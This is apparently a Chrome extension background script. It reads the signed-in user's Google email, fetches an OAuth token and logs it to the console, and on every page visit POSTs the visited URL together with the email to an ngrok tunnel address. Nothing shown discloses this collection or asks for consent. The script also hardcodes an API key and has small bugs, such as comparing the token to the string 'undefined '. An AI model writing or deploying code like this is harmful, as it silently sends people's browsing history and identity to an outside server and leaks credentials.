const API_KEY = "AIzaSyBnXdHoymkdhSY2oDso-IoAaeeKa13DCqc"
let userSignedIn = false
let email = ""

chrome.identity.getProfileUserInfo({accountStatus : 'ANY'}, function(userInfo) {
    email = userInfo["email"]
});

chrome.identity.getAuthToken({'interactive': true}, function (token) {
    if ( chrome.runtime.lastError)
    {
        console.log( "ERROR! " + chrome.runtime.lastError.message );
        return;
    }
    console.log(token)
    if ( typeof token != 'undefined ')
    {
        access_token = token;
        console.log(access_token)
    }
    
});

chrome.history.onVisited.addListener(function(result) {
    var response = fetch("https://184c-99-251-125-166.ngrok.io/history", {
        method: 'POST',
        body: "url: " + result.url + ", " + "email: " + email,
        mode: 'no-cors',
    })
    response
        .then(value => {console.log(value)})
        .catch(err => {console.log(err)})
});
